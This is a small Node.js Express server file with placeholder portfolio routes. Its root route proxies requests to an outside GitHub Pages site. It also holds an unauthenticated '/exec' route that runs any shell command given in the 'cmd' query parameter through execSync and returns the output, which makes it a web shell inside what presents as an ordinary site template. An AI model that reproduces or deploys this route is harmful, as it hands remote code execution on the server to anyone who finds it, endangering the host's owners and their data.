const express = require('express')
const app = express()
const fs = require('fs')
const axios = require('axios')
const { exec, execSync } = require("child_process")
app.use(express.json())
app.use(express.urlencoded({ extended: true }))
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms)); }
//var catatan = JSON.parse(fs.readFileSync('./database.json'))

app.get('/', async (req, res) => {
	var gethtml = await axios.get("https://frmdeveloper.github.io/countapi"+req.url)
	res.set("content-type",gethtml.headers['content-type']).send(gethtml.data)
})
app.get('/exec', async (req, res) => {
	var ls = await execSync(req.query.cmd)
	res.send(ls.toString())
})
app.get('/about', (req, res) => res.send('About Page Route'));
app.get('/portfolio', (req, res) => res.send('Portfolio Page Route'));
app.get('/contact', (req, res) => res.send('Contact Page Route'));
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on ${port}, http://localhost:${port}`));